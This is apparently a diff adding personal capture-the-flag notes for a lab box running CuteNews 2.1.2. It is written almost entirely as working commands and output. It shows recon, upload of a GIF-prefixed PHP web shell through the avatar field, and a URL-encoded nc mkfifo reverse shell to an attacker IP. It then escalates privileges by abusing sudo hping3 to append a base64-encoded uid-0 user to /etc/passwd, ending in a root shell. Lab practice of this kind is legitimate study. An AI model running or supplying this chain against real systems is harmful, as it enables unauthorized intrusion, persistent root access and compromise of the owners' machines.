@@ -1,0 +1,71 @@
+sudo nmap
+found port 80
+$ nikto -host http://192.168.187.128:80/
+
+found + /index.php?: # have index.php
+In brower run http://192.168.187.128:80/index.php
+Found Powered by CuteNews 2.1.2 
+
+$ searchsploit CuteNews 2.1.2
+CuteNews 2.1.2 - Arbitrary File Deletion                  | php/webapps/48447.txt
+CuteNews 2.1.2 - Authenticated Arbitrary File Upload      | php/webapps/48458.txt
+CuteNews 2.1.2 - Remote Code Execution                    | php/webapps/48800.py
+Not working 
+
+go github, found exploit.py, create test account successfully but payload no working. 
+login with test account.
+found upload avatar_file
+
+In burpsuite, upload 
+GIF89a;
+<?php system($_GET['cmd']); ?>
+as payload name rev1.php
+
+http://192.168.187.128/uploads/avatar_test_rev1.php?cmd=id 
+shows GIF89a; uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+reverse shell url encode: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.161 4444 >/tmp/f
+http://192.168.187.128/uploads/avatar_test_rev1.php?cmd=rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fsh -i 2>%261|nc 192.168.45.161 4444 >%2Ftmp%2Ff
+
+https://github.com/thewhiteh4t/cve-2019-11447/blob/main/cve-2019-11447.py # or can use this script to get a shell
+
+sudo -l
+User www-data may run the following commands on cute:
+    (root) NOPASSWD: /usr/sbin/hping3 --icmp
+
+find / -perm -u=s -type f 2>/dev/null
+Find SUID /usr/sbin/hping3
+
+fail a lot times try gtfobins to get root shell , but all fail due to this setting:
+www-data@cute:/tmp$ $ sudo ./hping3 /bin/sh -p
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+sudo: no tty present and no askpass program specified
+Need to Create a root-level user by writing to /etc/passwd, bypassing restrictions with base64.
+generate a hashed password for new user pwn with password password123, to passwd format then encode.
+$ openssl passwd -1 -salt salt password123
+$1$salt$/3NHsNrNmNbOO90IOW9dw/
+$ echo 'pwn:$1$salt$/3NHsNrNmNbOO90IOW9dw/:0:0:root:/root:/bin/bash' | base64
+cHduOiQxJHNhbHQkLzNOSHNOck5tTmJPTzkwSU9XOWR3LzowOjA6cm9vdDovcm9vdDovYmluL2Jh
+c2gK
+run below cmd in target shell, to avoid any block.
+echo 'exec /bin/sh -p -c "echo cHduOiQxJHNhbHQkLzNOSHNOck5tTmJPTzkwSU9XOWR3LzowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gK | base64 -d >> /etc/passwd"' | hping3
+To confirm new user pwn successfully add in.
+www-data@cute:/tmp$ $ tail -n 1 /etc/passwd
+pwn:$1$salt$/3NHsNrNmNbOO90IOW9dw/:0:0:root:/root:/bin/bash
+
+$ su pwn
+Password: $ password123
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+
+
